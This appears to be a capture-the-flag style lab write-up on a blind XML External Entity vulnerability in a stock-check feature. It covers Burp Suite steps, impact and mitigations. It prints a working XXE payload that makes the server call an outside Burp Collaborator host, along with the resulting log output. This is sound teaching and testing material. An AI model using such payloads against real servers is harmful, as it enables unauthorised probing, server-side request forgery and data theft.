# 1. Blind XXE with Out-of-Band Interaction

## 2. CVSS Score

**CVSS v3.1 Base Score: 9.1 (Critical)**
**CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)**

## 3. OWASP Top 10 Reference

* **A05:2021 – Security Misconfiguration**
* **A10:2021 – Server-Side Request Forgery (SSRF)**

---

## 4. Description of Vulnerability

This lab demonstrates a **blind XML External Entity (XXE)** vulnerability that does not directly return any data in the HTTP response. However, the XML parser still processes the external entity and triggers **out-of-band (OAST)** network interactions—making it detectable via tools like **Burp Collaborator**.

In this scenario, an attacker defines an external entity referencing a URL containing a Burp Collaborator payload. When the server processes the XML input, it attempts to resolve the external entity by making a DNS or HTTP request to the attacker-controlled domain—providing out-of-band evidence of successful exploitation.

---

## 5. Detailed Explanation of What We Performed

Since the application doesn’t reflect external entity content in its HTTP responses, we used **Burp Suite Professional** and its **Collaborator** feature to detect server interaction with a payload-hosting domain. The server’s attempt to resolve the malicious entity proves the existence of a blind XXE vulnerability.

---

## 6. Step-by-Step Procedure

🔹 **Step 1: Visit the Target and Intercept the Request**

1. Navigate to a product page on the lab website.
2. Click **"Check stock"**.
3. Intercept the resulting **POST** request using **Burp Suite Proxy**.

🔹 **Step 2: Generate a Burp Collaborator Payload**

4. In **Burp Suite**, go to the **Collaborator** tab.
5. Click **"Copy to clipboard"** to generate a unique Collaborator subdomain.

🔹 **Step 3: Inject the Malicious External Entity**

6. Modify the request in **Burp Repeater** or **Proxy** to include a malicious `DOCTYPE` declaration referencing the Burp Collaborator subdomain. Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

7. Replace `YOUR-COLLABORATOR-ID.burpcollaborator.net` with your actual Collaborator payload.

🔹 **Step 4: Forward the Request and Monitor Collaborator**

8. Forward the modified request to the server.
9. Return to the **Burp Collaborator** tab and click **"Poll now"**.

🔹 **Step 5: Confirm Server-Side Interaction**

10. Within a few seconds, you should see **DNS** and/or **HTTP** interactions initiated by the server, confirming the external entity was processed and the server reached out to your payload domain.

---

## 7. Impact of the Vulnerability

* **Data Exfiltration**: Though blind, XXE can be used to exfiltrate sensitive data via out-of-band channels.
* **Internal Resource Access**: If combined with SSRF, blind XXE may allow attackers to interact with internal services.
* **Reconnaissance**: Even without direct response data, attackers gain valuable insight into server behavior and configuration.

---

## 8. Recommendations and Mitigations

* **Disable DTD Processing**: Configure the XML parser to reject `DOCTYPE` declarations and external entities.
* **Use Hardened Parsers**: Employ secure XML libraries that reject XXE by default.
* **Enforce Outbound Filtering**: Restrict server-side applications from making unauthorized external network requests.
* **Monitor for DNS Leaks**: Watch for unexpected domain resolutions, especially to known payload infrastructure like Burp Collaborator.

---

## 9. References

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe/blind)

---

## 10. Proof of Concept

### Payload Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://abc123xyz.burpcollaborator.net"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Collaborator Log Output:

```
[DNS] abc123xyz.burpcollaborator.net -> <source-ip>
[HTTP] GET / HTTP/1.1
Host: abc123xyz.burpcollaborator.net
User-Agent: Java/1.8.0
